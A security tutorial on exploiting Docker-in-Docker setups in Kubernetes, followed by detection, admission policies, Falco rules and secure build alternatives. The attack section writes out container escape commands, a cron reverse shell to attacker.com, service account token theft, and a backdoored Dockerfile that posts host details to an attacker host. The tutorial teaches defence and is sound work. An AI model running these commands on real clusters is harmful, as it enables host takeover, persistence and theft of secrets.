# Docker-in-Docker (DIND) Exploitation in Kubernetes

## Context & Problem

**Business Problem**: Docker-in-Docker configurations in Kubernetes create critical security vulnerabilities that allow container escape, privilege escalation, and complete cluster compromise through Docker socket access and privileged container abuse.

**Real-World Impact**:
- **Tesla Cryptojacking (2018)**: Attackers used privileged containers to mine cryptocurrency
- **Container Runtime Escape**: Access to Docker socket = root access to host system
- **Supply Chain Compromise**: Malicious images built and pushed from compromised containers
- **Lateral Movement**: Use escaped container to compromise other nodes and workloads

## First Principles: Why DIND is Extremely Dangerous

### The Docker Socket Attack Vector
```
Pod → Mount Docker Socket → Control Docker Daemon → Escape Container → Host Root Access
```

### Critical Vulnerabilities in DIND Setups
1. **Docker Socket Exposure**: `/var/run/docker.sock` mounted into containers
2. **Privileged Containers**: `privileged: true` for Docker access
3. **Host Filesystem Access**: Host paths mounted into containers
4. **Shared Kernel**: Container shares kernel with host
5. **Docker Group Permissions**: Group membership = root equivalent access

### Attack Chain Progression
```
1. Gain access to DIND container
2. Use Docker socket to create privileged container
3. Mount host filesystem into new container
4. Execute commands as root on host
5. Install persistent backdoors
6. Compromise entire cluster
```

## Production Implementation: DIND Attack Scenarios

### Scenario 1: CI/CD Pipeline with Exposed Docker Socket

#### Vulnerable CI/CD Setup (NEVER use in production)
```yaml
# WARNING: Extremely dangerous configuration - for educational purposes only
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-ci-cd
  namespace: ci-cd
spec:
  replicas: 1
  selector:
    matchLabels:
      app: ci-cd-builder
  template:
    metadata:
      labels:
        app: ci-cd-builder
    spec:
      containers:
      - name: docker-builder
        image: docker:20.10-dind
        securityContext:
          privileged: true  # ❌ CRITICAL: Privileged access
        volumeMounts:
        - name: docker-socket
          mountPath: /var/run/docker.sock  # ❌ CRITICAL: Docker socket access
        - name: host-root
          mountPath: /host  # ❌ CRITICAL: Host filesystem access
        env:
        - name: DOCKER_HOST
          value: unix:///var/run/docker.sock
        command: ["/bin/sh"]
        args: ["-c", "dockerd-entrypoint.sh & sleep infinity"]
      volumes:
      - name: docker-socket
        hostPath:
          path: /var/run/docker.sock  # ❌ Exposes Docker daemon
          type: Socket
      - name: host-root
        hostPath:
          path: /  # ❌ Exposes entire host filesystem
          type: Directory
```

#### Container Escape Attack Commands
```bash
# Step 1: Access the vulnerable container
kubectl exec -it deployment/vulnerable-ci-cd -n ci-cd -- /bin/sh

# Step 2: Verify Docker socket access
docker version
docker ps

# Step 3: Create privileged container with host filesystem access
docker run -it --privileged --pid=host --net=host \
  -v /:/host alpine:latest chroot /host bash

# Step 4: You now have ROOT access to the host system!
whoami  # Should show 'root'
ls /host/root  # Can access host root directory
ps aux  # Can see ALL host processes

# Step 5: Install backdoor (for educational demonstration)
echo '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' >> /var/spool/cron/crontabs/root

# Step 6: Access other containers on the node
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"
docker exec -it <other-container> /bin/sh

# Step 7: Extract secrets from other containers
docker inspect <container-name> | grep -i env
docker exec <container-name> cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Scenario 2: Build Pipeline with Malicious Image Injection

#### Attack: Compromise Build Process
```bash
# Inside the compromised DIND container
# Build malicious image that gets pushed to registry
cat > Dockerfile << 'EOF'
FROM alpine:latest
RUN apk add --no-cache curl
# Add backdoor that runs on container start
RUN echo '#!/bin/sh\ncurl -X POST http://attacker.com/callback -d "$(hostname):$(whoami)"' > /backdoor.sh
RUN chmod +x /backdoor.sh
ENTRYPOINT ["/backdoor.sh"]
EOF

# Build and tag as legitimate image
docker build -t legitimate-app:latest .

# Push to registry (if credentials are available)
docker push registry.company.com/legitimate-app:latest

# The malicious image will now be deployed across the cluster
```

## Troubleshooting Scenarios: "What happens when this breaks at 2AM?"

### Crisis Scenario 1: Cryptocurrency Mining Detection
```bash
# Symptoms: High CPU usage, unusual network traffic
kubectl top nodes
kubectl top pods --all-namespaces

# Investigation: Look for mining indicators
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}' | grep -i "mine\|crypto\|xmr"

# Check for privileged containers
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}' | grep true

# Immediate response: Scale down suspicious workloads
kubectl scale deployment suspicious-deployment --replicas=0

# Forensics: Check for Docker socket mounts
kubectl get pods --all-namespaces -o yaml | grep -A 5 -B 5 "docker.sock"
```

### Crisis Scenario 2: Cluster-Wide Compromise
```bash
# Detection: Unusual administrative activity
kubectl get events --sort-by=.metadata.creationTimestamp | grep -i "privileged\|hostpath\|docker"

# Emergency response: Isolate affected nodes
kubectl cordon <compromised-node>
kubectl drain <compromised-node> --ignore-daemonsets --delete-emptydir-data

# Investigation: Check for persistent threats
# On the compromised node:
sudo docker ps -a | grep -v "k8s_POD"
sudo crontab -l
sudo find /etc -name "*docker*" -mtime -1
sudo netstat -tulpn | grep LISTEN

# Recovery: Rebuild compromised nodes
kubectl delete node <compromised-node>
# Provision new clean node
```

## Evolution & Alternatives: Secure Container Building

### Modern Secure Alternatives to DIND

#### Option 1: Rootless Docker with Dedicated Nodes
```yaml
# Dedicated build node pool with rootless Docker
apiVersion: v1
kind: Node
metadata:
  name: secure-build-node
  labels:
    node-type: secure-build
    docker-mode: rootless
spec:
  taints:
  - key: "build-only"
    value: "true"
    effect: NoSchedule
---
# Pod that only runs on secure build nodes
apiVersion: v1
kind: Pod
metadata:
  name: rootless-docker-build
spec:
  nodeSelector:
    node-type: secure-build
  tolerations:
  - key: "build-only"
    operator: "Equal"
    value: "true"
    effect: "NoSchedule"
  containers:
  - name: builder
    image: docker:rootless
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
    # No privileged access needed
    # No Docker socket mounting
```

#### Option 2: Kaniko for Secure Image Builds
```yaml
# Kaniko: Build container images without Docker daemon
apiVersion: batch/v1
kind: Job
metadata:
  name: kaniko-build
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: kaniko
        image: gcr.io/kaniko-project/executor:latest
        args:
        - "--context=git://github.com/company/app"
        - "--destination=registry.company.com/app:latest"
        - "--cache=true"
        securityContext:
          runAsNonRoot: true
          runAsUser: 1000
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        volumeMounts:
        - name: docker-config
          mountPath: /kaniko/.docker/
          readOnly: true
        - name: tmp
          mountPath: /tmp
      volumes:
      - name: docker-config
        secret:
          secretName: docker-registry-credentials
      - name: tmp
        emptyDir: {}
```

#### Option 3: Buildah with Podman (No Daemon)
```yaml
# Buildah: Build OCI images without daemon
apiVersion: batch/v1
kind: Job
metadata:
  name: buildah-build
spec:
  template:
    spec:
      restartPolicy: Never
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
      containers:
      - name: buildah
        image: quay.io/buildah/stable:latest
        command: ["/bin/bash"]
        args:
        - -c
        - |
          buildah bud -t app:latest .
          buildah push app:latest docker://registry.company.com/app:latest
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
            add:
            - SETUID
            - SETGID
        volumeMounts:
        - name: build-context
          mountPath: /workspace
        - name: containers-conf
          mountPath: /etc/containers/
        - name: tmp
          mountPath: /tmp
      volumes:
      - name: build-context
        emptyDir: {}
      - name: containers-conf
        configMap:
          name: buildah-config
      - name: tmp
        emptyDir: {}
```

### DIND Detection and Prevention Policies

#### Admission Controller Policy (OPA Gatekeeper)
```yaml
# Prevent Docker socket mounting
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: blockdockersocket
spec:
  crd:
    spec:
      names:
        kind: BlockDockerSocket
      validation:
        openAPIV3Schema:
          type: object
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package blockdockersocket
        
        violation[{"msg": msg}] {
          input.review.object.spec.volumes[_].hostPath.path == "/var/run/docker.sock"
          msg := "Docker socket mounting is prohibited for security reasons"
        }
        
        violation[{"msg": msg}] {
          input.review.object.spec.template.spec.volumes[_].hostPath.path == "/var/run/docker.sock"
          msg := "Docker socket mounting is prohibited in pod templates"
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: BlockDockerSocket
metadata:
  name: no-docker-socket
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
      - apiGroups: ["apps"]
        kinds: ["Deployment", "StatefulSet", "DaemonSet"]
```

#### Kyverno Policy for DIND Prevention
```yaml
# Block privileged containers and Docker socket access
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: prevent-dind-vulnerabilities
spec:
  validationFailureAction: enforce
  background: true
  rules:
  - name: block-docker-socket
    match:
      any:
      - resources:
          kinds:
          - Pod
          - Deployment
          - StatefulSet
          - DaemonSet
    validate:
      message: "Mounting Docker socket is prohibited"
      pattern:
        spec:
          =(volumes):
          - =(hostPath):
              =(path): "!/var/run/docker.sock"
  - name: block-privileged-containers
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Privileged containers are prohibited"
      pattern:
        spec:
          =(securityContext):
            =(privileged): "false"
          containers:
          - name: "*"
            =(securityContext):
              =(privileged): "false"
  - name: block-host-path-root
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Mounting host root filesystem is prohibited"
      pattern:
        spec:
          =(volumes):
          - =(hostPath):
              =(path): "!/"
```

### Runtime Detection with Falco

```yaml
# Falco rules for DIND attack detection
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-dind-rules
data:
  dind-rules.yaml: |
    - rule: Docker Socket Access from Container
      desc: Detect access to Docker socket from container
      condition: >
        open_read and container and
        fd.name=/var/run/docker.sock
      output: >
        Docker socket accessed from container 
        (container=%container.name process=%proc.name file=%fd.name)
      priority: ERROR
      
    - rule: Docker Command in Container
      desc: Detect Docker commands executed in containers
      condition: >
        spawned_process and container and
        proc.name=docker
      output: >
        Docker command executed in container
        (container=%container.name process=%proc.name cmdline=%proc.cmdline)
      priority: WARNING
      
    - rule: Privileged Container Created
      desc: Detect creation of privileged containers
      condition: >
        container_started and
        k8s_audit and
        ka.target.resource=pods and
        ka.req.pod.privileged=true
      output: >
        Privileged container created
        (user=%ka.user.name pod=%ka.target.name namespace=%ka.target.namespace)
      priority: ERROR
      
    - rule: Host Filesystem Mount
      desc: Detect mounting of host filesystem
      condition: >
        container_started and
        k8s_audit and
        ka.target.resource=pods and
        ka.req.pod.host_volumes contains "/"
      output: >
        Host filesystem mounted in pod
        (user=%ka.user.name pod=%ka.target.name namespace=%ka.target.namespace)
      priority: ERROR
```

## Next Steps: Securing Container Build Pipelines

### Production-Ready Build Security

#### 1. Use Dedicated Build Infrastructure
```bash
# Separate build cluster or node pool
kubectl create namespace secure-builds
kubectl label namespace secure-builds security-level=high

# Dedicated node pool for builds only
kubectl taint nodes build-node-pool build-only=true:NoSchedule
```

#### 2. Implement Build Security Scanning
```yaml
# Trivy security scanner integration
apiVersion: batch/v1
kind: Job
metadata:
  name: security-scan
spec:
  template:
    spec:
      containers:
      - name: trivy-scanner
        image: aquasec/trivy:latest
        command: ["trivy"]
        args:
        - "image"
        - "--exit-code=1"
        - "--severity=HIGH,CRITICAL"
        - "myapp:latest"
```

#### 3. Secure Registry with Image Signing
```bash
# Use Cosign for image signing
cosign generate-key-pair
cosign sign --key cosign.key registry.company.com/app:latest

# Verify signatures in admission controller
cosign verify --key cosign.pub registry.company.com/app:latest
```

### Business Impact Measurement
- **Security**: Prevent container escape and cluster compromise
- **Compliance**: Meet container security standards (CIS, NIST)
- **Operational**: Reduce incident response costs and downtime
- **Development**: Enable secure CI/CD without compromising security

**Production Reality**: Docker-in-Docker is one of the most dangerous patterns in Kubernetes. While convenient for CI/CD, it creates critical security vulnerabilities that have led to numerous real-world breaches. Modern alternatives like Kaniko and Buildah provide secure image building without these risks.